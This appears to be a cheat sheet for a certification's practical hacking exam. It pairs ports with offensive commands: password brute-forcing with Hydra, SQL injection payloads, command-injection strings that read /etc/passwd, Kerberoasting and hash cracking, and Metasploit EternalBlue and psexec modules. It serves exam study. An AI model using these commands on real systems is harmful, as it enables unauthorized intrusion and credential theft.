# Port → Tool → Answer  
  
> See a port in nmap results? This tells you exactly what to do.  
  
---  
  
## Port 21 — FTP  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "What is the password for FTP user X?" | Hydra | `hydra -l [user] -P rockyou.txt [ip] ftp` |  
| "What files are on the FTP server?" | ftp | `ftp [ip]` → `ls` → `get [file]` |  
| "Is anonymous login enabled?" | Nmap | `nmap -p 21 --script ftp-anon [ip]` |  
  
---  
  
## Port 22 — SSH  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "What is the SSH password for user X?" | Hydra | `hydra -l [user] -P rockyou.txt [ip] ssh` |  
| "What OS is running?" | Nmap | `nmap -sV -p 22 [ip]` (banner shows OS) |  
  
---  
  
## Port 80 / 8080 / 443 — HTTP/HTTPS  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "What is the database name?" | SQLMap | `sqlmap -u "http://[ip]/page?id=1" --dbs` |  
| "Dump table X from database Y" | SQLMap | `sqlmap -u "URL" -D [db] -T [table] --dump` |  
| "What WordPress users exist?" | WPScan | `wpscan --url http://[ip] --enumerate u` |  
| "What vulnerable plugins?" | WPScan | `wpscan --url http://[ip] --enumerate vp` |  
| "What web server is running?" | Nikto | `nikto -h http://[ip]` |  
| "Find hidden directories" | dirb | `dirb http://[ip]` |  
| "How many user accounts?" | Cmd injection | `; cat /etc/passwd` or `| net user` |  
| "What is the web server version?" | Nmap | `nmap -sV -p 80 [ip]` |  
| "Find vulnerabilities in the web app" | ZAP | Open ZAP → Automated Scan → target URL |  
  
### SQLi Manual (if SQLMap doesn't work)  
```  
' OR 1=1 --  
' UNION SELECT NULL,NULL,NULL --  
' UNION SELECT username,password FROM users --  
```  
  
---  
  
## Port 88 — Kerberos (= Domain Controller)  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "What is the domain name?" | Nmap | `nmap -A -sC -sV [ip]` → look for domain in output |  
| "Find vulnerable AD users" | Impacket | `python3 GetNPUsers.py [DOMAIN]/ -no-pass -usersfile users.txt -dc-ip [ip]` |  
| "What is user X's password?" | John/Hashcat | Crack the AS-REP hash: `hashcat -m 18200 hash.txt rockyou.txt` |  
| "Kerberoast the domain" | Rubeus | `rubeus.exe kerberoast /outfile:hash.txt` → `hashcat -m 13100` |  
| "Which users share the same password?" | CME | `cme rdp [subnet]/24 -u users.txt -p "password"` |  
  
---  
  
## Port 135 / 137-139 / 445 — SMB/NetBIOS  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "What OS is the target running?" | Nmap | `nmap --script smb-os-discovery -p 445 [ip]` |  
| "List shared folders" | Nmap | `nmap --script smb-enum-shares -p 445 [ip]` |  
| "List users on the machine" | Nmap | `nmap --script smb-enum-users -p 445 [ip]` |  
| "What is the password for user X?" | enum4linux + crack | `enum4linux -a [ip]` or exploit → `hashdump` → `hashcat -m 1000` |  
| "Exploit this Windows 7 machine" | Metasploit | `use exploit/windows/smb/ms17_010_eternalblue` |  
| "Login with hash/creds" | Metasploit | `use exploit/windows/smb/psexec` → set SMBUser/SMBPass |  
| "Full enumeration" | enum4linux | `enum4linux -a [ip]` |  
  
---  
  
## Port 161 — SNMP  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "What info can you get from SNMP?" | snmpwalk | `snmpwalk -v2c -c public [ip]` |  
| "What is the hostname/OS?" | snmpwalk | `snmpwalk -v1 -c public [ip] \| grep -i sysname` |  
| "List running services" | snmpwalk | `snmpwalk -v1 -c public [ip] \| grep STRING` |  
  
---  
  
## Port 389 / 636 — LDAP  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "Enumerate directory users" | ldapsearch | `ldapsearch -x -h [ip] -b "dc=target,dc=com"` |  
| "How many users in AD?" | ldapsearch | `ldapsearch -x -h [ip] -b "dc=target,dc=com" "objectclass=user"` |  
| "Enumerate LDAP" | Nmap | `nmap -p 389 --script ldap-search [ip]` |  
  
---  
  
## Port 1433 — MSSQL  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "What is the MSSQL password?" | Hydra | `hydra -l [user] -P rockyou.txt [ip] mssql` |  
| "List databases" | mssqlclient | `python3 mssqlclient.py [DOMAIN]/[user]:[pass]@[ip]` → `SELECT name FROM sys.databases;` |  
| "Exploit MSSQL" | Metasploit | `use exploit/windows/mssql/mssql_payload` → set creds → exploit |  
  
---  
  
## Port 3306 — MySQL  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "What is the MySQL password?" | Hydra | `hydra -l root -P rockyou.txt [ip] mysql` |  
| "List databases" | mysql | `mysql -h [ip] -u root -p` → `SHOW DATABASES;` |  
| "Dump data" | SQLMap | `sqlmap -u "http://[ip]/page?id=1" --dbs` |  
  
---  
  
## Port 3389 — RDP  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "Brute force RDP login" | Hydra | `hydra -l [user] -P rockyou.txt [ip] rdp` |  
| "Connect to RDP" | Remmina/xfreerdp | `xfreerdp /u:[user] /p:[pass] /v:[ip]` |  
  
---  
  
## Port 5555 — ADB (Android)  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "What files are on the Android device?" | ADB | `adb connect [ip]:5555` → `adb shell ls /sdcard/` |  
| "Retrieve file from Android" | ADB | `adb pull /sdcard/[file] .` |  
| "Get a shell on Android" | PhoneSploit | Run `phonesploit` → connect → shell |  
  
---  
  
## Port 5900 — VNC  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "Brute force VNC" | Hydra | `hydra -P rockyou.txt [ip] vnc` |  
  
---  
  
## No Port Needed — File-Based Tasks  
  
### Steganography (usually on Windows machine Desktop)  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "Find hidden message in image" | steghide | `steghide extract -sf image.jpg` (try blank password first) |  
| "Find hidden data in image" | OpenStego | GUI → Extract Data → select image |  
| "Find hidden text in .txt file" | Snow | `snow -C -p "password" file.txt` |  
| "What's embedded in this file?" | binwalk | `binwalk -e file.jpg` |  
| "Check image metadata" | exiftool | `exiftool image.jpg` |  
  
### Cryptography (usually on Windows machine)  
| Question Pattern | Tool | Command |  
|-----------------|------|---------|  
| "Decrypt this VeraCrypt volume" | VeraCrypt | GUI → Select File → Mount → enter password → browse |  
| "How many files in encrypted volume?" | VeraCrypt | Mount → open → count files |  
| "Decrypt this file" | CrypTool | Open file → enter key → decrypt |  
| "What is the hash of file X?" | md5sum/sha1sum | `md5sum file.txt` or `sha256sum file.txt` |  
| "Which file was tampered?" | md5sum | `md5sum file1 file2 file3` → different hash = tampered |  
  
### Hash Cracking (given a hash file)  
| Hash Looks Like | Type | Hashcat Mode |  
|----------------|------|-------------|  
| 32 hex chars | MD5 or NTLM | `-m 0` (MD5) or `-m 1000` (NTLM) |  
| 40 hex chars | SHA-1 | `-m 100` |  
| 64 hex chars | SHA-256 | `-m 1400` |  
| Starts with $6$ | SHA-512crypt | `-m 1800` |  
| Starts with $2a$ | bcrypt | `-m 3200` |  
| $krb5asrep$ | AS-REP | `-m 18200` |  
| $krb5tgs$ | Kerberoast | `-m 13100` |  
| NTLMv2 | NTLMv2 | `-m 5600` |  
  
```  
hashcat -m [mode] hash.txt /usr/share/wordlists/rockyou.txt  
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
hash-identifier                              # paste hash to identify type  
```  
  
### Wireshark (given a .pcap file)  
| Question Pattern | Filter |  
|-----------------|--------|  
| "Find credentials" | `http.request.method == "POST"` or `ftp.request.command == "PASS"` |  
| "Traffic from specific IP" | `ip.addr == [ip]` |  
| "Find DNS queries" | `dns` |  
| "Find the attacker IP" | `tcp.flags.syn == 1 && tcp.flags.ack == 0` → most SYN = scanner |  
| "Extract data from stream" | Right-click → Follow → TCP Stream |  
  
### Malware Analysis (given a suspicious file)  
| Question Pattern | Tool | What to look for |  
|-----------------|------|-----------------|  
| "What is the entropy?" | Detect It Easy (DIE) | Entropy tab → note the value |  
| "Is it packed?" | DIE | Packer detection → UPX etc. |  
| "What compiler was used?" | DIE | Info tab |  
  
---  
  
## Vulnerability Scanner Results  
| Question Pattern | Tool | How |  
|-----------------|------|-----|  
| "What is the CVSS score of vuln X?" | OpenVAS | Scans → results → search CVE → read score |  
| "What severity is vulnerability X?" | Nessus/OpenVAS | Check report, sort by severity |  
  
---  
  
## Universal Fallback  
If stuck on ANY question:  
1. `nmap -A -sC -sV -p- [target-ip]` — get everything about the target  
2. `nmap --script vuln [target-ip]` — find vulnerabilities  
3. Google: `"CEH practical" + [tool name] + [what you're trying to do]`  
